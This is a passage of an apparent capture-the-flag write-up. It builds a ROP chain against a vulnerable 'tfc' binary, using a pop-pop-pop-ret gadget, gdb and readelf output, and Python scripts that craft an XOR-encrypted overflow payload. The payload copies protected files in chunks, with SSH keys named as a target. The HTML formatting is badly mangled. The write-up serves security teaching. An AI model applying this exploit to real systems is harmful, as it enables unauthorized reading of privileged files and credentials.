<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">return</span> <span class="n">to</span> <span class="nl">next_func</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">-</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
<span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p>But next_func requires completely different arguments! We need to align the stack pointer after returning from &lsquo;write&rsquo;. This can be removing a few values from the stack before return to next_func.</p>

<p>This removal of values can be using a primitive called <code>pop pop pop ret</code>. The return address for the libc calls is a place in the binary that contains three pop instructions, which pop three values from the stack, and then return to whatever value is on the stack. This allows code execution to continue smoothly, otherwise it might choke on one of the values that we pass to a libc function. I used my ropgadget script to find it at <code>0x80489d6</code>; there are many more, and many other ways to find them. The basic ROP chain element now looks like this:</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="n">ADDR</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">PPPR</span>        <span class="err">#</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">ret</span> <span class="n">primitive</span><span class="p">,</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">values</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stack</span><span class="p">.</span>
                    <span class="cp"># this pppr primitive must have enough POPs to remove N arguments from the stack!&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="n">ARG_1</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">one</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="n">ARG_2</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">two</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="n">ARG_n</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">n</span>   <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">+</span><span class="mi">14</span><span class="o">:</span> <span class="n">NEXT</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">next</span> <span class="n">function</span> <span class="n">at</span> <span class="n">NEXT</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p>So we have all the values we need, let&rsquo;s put it together in a semi-smart and flexible way. I made a python script to handle building and encrypting the payload:</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">x</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>

    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>

<span class="k">return</span> <span class="n">output</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">genPayload</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">*</span><span class="mi">4124</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>

<span class="c"># write 0x200 bytes to &#39;write&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>       <span class="c"># fd</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span> <span class="c"># buffer</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>     <span class="c"># size_t</span>

<span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">main</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="o">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">())</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p>OK, so I&rsquo;m already ahead a bit. We will need a buffer to store bytes from the &lsquo;read&rsquo; file later. The binary does not seem to have a lot of locations for this, as can be seen from <code>readelf -l ./tfc</code>:</p>

<pre><code class="bash">bas@tritonal:~/tmp/knockknock$ readelf -l tfc

Elf file type is EXEC (Executable file)
Entry point 0x8048500
There are 8 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
</code></pre>

<p>Looks like there is some space in the DYNAMIC or LOAD sections. I fired up the binary in <code>gdb</code> to verify:</p>

<pre><code class="bash">Breakpoint 1, 0x08048927 in main ()
gdb-peda$ x/400x 0x08049c54
0x8049c54 &lt;_DYNAMIC&gt;:   0x00000001  0x00000010  0x0000000c  0x08048404
0x8049c64 &lt;_DYNAMIC+16&gt;:    0x0000000d  0x08048a54  0x00000019  0x08049c48
0x8049c74 &lt;_DYNAMIC+32&gt;:    0x0000001b  0x00000004  0x0000001a  0x08049c4c
0x8049c84 &lt;_DYNAMIC+48&gt;:    0x0000001c  0x00000004  0x00000004  0x0804818c
0x8049c94 &lt;_DYNAMIC+64&gt;:    0x6ffffef5  0x080481d8  0x00000005  0x080482d8
0x8049ca4 &lt;_DYNAMIC+80&gt;:    0x00000006  0x080481f8  0x0000000a  0x00000087
0x8049cb4 &lt;_DYNAMIC+96&gt;:    0x0000000b  0x00000010  0x00000015  0xf7715924
0x8049cc4 &lt;_DYNAMIC+112&gt;:   0x00000003  0x08049d48  0x00000002  0x00000060
0x8049cd4 &lt;_DYNAMIC+128&gt;:   0x00000014  0x00000011  0x00000017  0x080483a4
0x8049ce4 &lt;_DYNAMIC+144&gt;:   0x00000011  0x0804839c  0x00000012  0x00000008
0x8049cf4 &lt;_DYNAMIC+160&gt;:   0x00000013  0x00000008  0x6ffffffe  0x0804837c
0x8049d04 &lt;_DYNAMIC+176&gt;:   0x6fffffff  0x00000001  0x6ffffff0  0x08048360
0x8049d14 &lt;_DYNAMIC+192&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
0x8049d24 &lt;_DYNAMIC+208&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
0x8049d34 &lt;_DYNAMIC+224&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
0x8049d44:  0x00000000  0x08049c54  0xf7715938  0xf77084a0
0x8049d54 &lt;strcmp@got.plt&gt;: 0x08048446  0x08048456  0x08048466  0x08048476
0x8049d64 &lt;puts@got.plt&gt;:   0x08048486  0x08048496  0x080484a6  0xf7545970
0x8049d74 &lt;write@got.plt&gt;:  0x080484c6  0x080484d6  0x080484e6  0x080484f6
0x8049d84:  0x00000000  0x00000000  0x00000000  0x00000000
0x8049d94:  0x00000000  0x00000000  0x00000000  0x00000000
0x8049da4 &lt;__dso_handle&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
0x8049db4 &lt;__dso_handle+16&gt;:    0x00000000  0x00000000  0x00000000  0x5f5f5f5f
0x8049dc4 &lt;banr+4&gt;: 0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f
0x8049dd4 &lt;banr+20&gt;:    0x5f5f5f5f  0x5f5f5f5f  0x205f5f5f  0x5c0a0d20
0x8049de4 &lt;banr+36&gt;:    0x20205f5f  0x5f5f2020  0x5f5c2f5f  0x5f202020
0x8049df4 &lt;banr+52&gt;:    0x5f5f5f5f  0x205f5c2f  0x5f5f2020  0x205c205f
...
0x8049fe4:  0x00000000  0x00000000  0x00000000  0x00000000
0x8049ff4:  0x00000000  0x00000000  0x00000000  Cannot access memory at address 0x804a000
</code></pre>

<p>We can&rsquo;t really use places like <code>0x8049d54 &lt;strcmp@got.plt&gt;</code>, because there are function pointers there, ones that we need! I picked this location at <code>0x8049db8</code>. It didn&rsquo;t look like it contained crucial information. Furthermore, it was writeable and had a decent number of bytes behind it.</p>

<p>While we&rsquo;re at it, let&rsquo;s make sure we can read and write large files. Unfortunately, the buffer is only 0x200 bytes large. This means we have to chunk it up!</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">x</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>

    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>

<span class="k">return</span> <span class="n">output</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">genPayload</span><span class="p">(</span><span class="n">filesize</span><span class="p">):</span>
    <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="err">!</span><span class="p">]</span> <span class="n">filesize</span> <span class="o">=</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filesize</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>

<span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>

<span class="c"># open(&#39;read&#39;) for reading. fd = 0x06</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049315</span><span class="p">)</span> <span class="c"># &quot;read\x00&quot;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># readonly</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># ?</span>

<span class="n">iterations</span> <span class="o">=</span> <span class="p">(</span><span class="n">filesize</span> <span class="o">/</span> <span class="mh">0x200</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
<span class="k">print</span> <span class="s">&quot;[!] need {} iterations&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">iterations</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">iterations</span><span class="p">):</span>
    <span class="c"># read 0x200 bytes from &#39;read&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048450</span><span class="p">)</span> <span class="c"># read@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>       <span class="c"># fd</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span> <span class="c"># buffer</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>     <span class="c"># filesize  --&amp;gt; not a lot to work with, but enough for ssh keys</span>

    <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>       <span class="c"># fd</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span> <span class="c"># buffer</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>     <span class="c"># size_t</span>

<span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">main</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Usage</span><span class="p">:</span> <span class="p">{}</span> <span class="o">&lt;</span><span class="nb">file</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Please</span> <span class="n">provide</span> <span class="n">proper</span> <span class="n">files</span><span class="o">/</span><span class="n">symlinks</span> <span class="ow">in</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">read</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">and</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
        <span class="nb">exit</span> <span class="o">-</span><span class="mi">1</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">i</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">i</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p>This python code will add blocks of read &amp; write ROP chain elements, just as many are needed for a certain file. This is also why we&rsquo;ve opened the output file as O_APPEND: each write will simply add to the existing file, no hassle!</p>

